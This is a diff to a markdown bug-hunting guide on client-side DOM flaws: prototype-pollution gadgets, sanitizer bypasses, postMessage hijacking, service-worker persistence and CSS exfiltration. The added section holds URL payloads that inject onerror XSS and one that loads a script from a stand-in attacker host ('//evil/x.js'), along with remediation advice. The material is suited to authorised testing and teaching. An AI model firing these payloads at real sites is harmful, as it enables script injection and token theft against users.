@@ -3,6 +3,9 @@ name: hunt-dom
 description: "Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction."
 sources: portswigger_research, hackerone_public, github_security_advisories
 report_count: 14
+cwe: [CWE-79, CWE-1321, CWE-601, CWE-345, CWE-829]
+cvss_baseline: "Medium (6.1) DOM-XSS / clobbering with limited reach → High (7.5-8.1) same-origin token theft, postMessage→account action, SW persistence → Critical when it yields ATO."
+related_skills: [hunt-xss, hunt-prototype-pollution, hunt-open-redirect, hunt-oauth, hunt-cors]
 ---
 
 # HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil
@@ -261,6 +264,35 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 ```
 
 ---
+
+## New Techniques (2024-2026)
+
+### Client-side prototype pollution → DOM-XSS gadgets
+Browser PP is a top modern DOM bug. Pollute via URL/JSON reaching a client merge (`$.extend`, `Object.assign`, `_.merge`, query parsers), then trigger a library **gadget** that reads the polluted prop into a sink:
+```
+?__proto__[srcdoc]=<img src onerror=alert(1)>        # sanitizer/iframe gadget
+?constructor[prototype][src]=//evil/x.js             # script-src gadget
+#__proto__[innerHTML]=<img src onerror=alert(1)>
+```
+Known gadgets exist in older jQuery, Google Closure, Wistia, Adobe DTM, and many templating libs. DOM-Invader → "prototype pollution" auto-finds source→gadget. Cross-ref `hunt-prototype-pollution`.
+
+### Sanitizer & Trusted-Types bypass (mutation XSS)
+Even with DOMPurify/Trusted Types, newer bypasses exist (DOMPurify 3.x mXSS via nesting/`<template>`/MathML-foreignObject namespace confusion; config gaps allowing `data:`/`<style>`). Test the exact DOMPurify version and config; mXSS re-parses sanitized HTML into an executing form. Also `innerHTML` after `setHTML()`/sink misuse.
+
+### postMessage → sensitive action (not just XSS)
+Beyond `innerHTML` sinks, hijack handlers that perform state changes or token relays (SSO/payment/chat widgets) with `*` targetOrigin or no origin check; win the handler race before an origin guard attaches. Chain to OAuth token theft (`hunt-oauth`).
+
+### Service Worker persistence & cache hijack
+A registrable SW scope + an upload/route returning `text/javascript` on your content → register an attacker SW that intercepts same-origin fetches → durable XSS/token theft surviving navigation.
+
+### Source→sink sweep (2025 sinks)
+Grep for `location.hash/search`, `document.referrer`, `postMessage` data, `window.name` → into `innerHTML`, `document.write`, `eval`, `setTimeout(str)`, `location`, `script.src`, `a.href=javascript:`, `el.setAttribute('srcdoc')`, framework raw-HTML (`dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`).
+
+## Remediation
+
+- Strict CSP (no `unsafe-inline`, no `data:` script, nonce/hash) + Trusted Types to gate DOM sinks; keep DOMPurify current and sanitize before any `innerHTML`/`srcdoc`.
+- Null-proto objects for client-parsed data; validate merge keys (reject `__proto__`/`constructor`/`prototype`); avoid polluting global config from URL.
+- Always check `event.origin` (allowlist) in postMessage handlers; never post secrets with `'*'`; constrain SW scope and never serve user content as `text/javascript` same-origin.
 
 ## Validation (false-positive discipline)
 
